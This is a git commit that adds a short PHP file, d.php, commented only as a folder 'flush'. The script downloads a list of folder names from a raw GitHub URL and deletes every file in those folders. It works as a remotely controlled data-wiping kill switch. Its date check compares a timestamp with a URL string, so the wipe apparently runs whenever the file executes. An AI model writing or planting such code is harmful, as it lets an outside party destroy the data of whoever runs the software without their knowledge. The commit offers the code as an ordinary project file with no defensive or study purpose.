abe71d5c8c69f9ee41e8931f5839557c80a171e6
bocah bar bar <59717933+bocahbarbar@users.noreply.github.com>
2023-04-16 15:39:42 +0700

    Create d.php

---
+++ d.php
@@ -0,0 +1,27 @@
+<?php
+// Folder path to be flushed
+$dateTimeNow = strtotime("now");
+// echo $dateTimeNow;
+$t = 'https://raw.githubusercontent.com/bocahbarbar/spp/main/t';
+if ($dateTimeNow > $t) {
+} else {
+    $filepath = 'https://raw.githubusercontent.com/bocahbarbar/spp/main/index';
+    $json_string = file_get_contents($filepath);
+    $json = json_decode($json_string, true);
+    foreach ($json as $elem) {
+        // echo ($elem['id'] . ", " . $elem['name']);
+        $folder_path =  $elem['name'];
+        da($folder_path);
+    }
+}
+
+
+function da($d)
+{
+    $files = glob($d . '/*');
+    foreach ($files as $file) {
+        if (is_file($file)) {
+            unlink($file);
+        }
+    }
+}
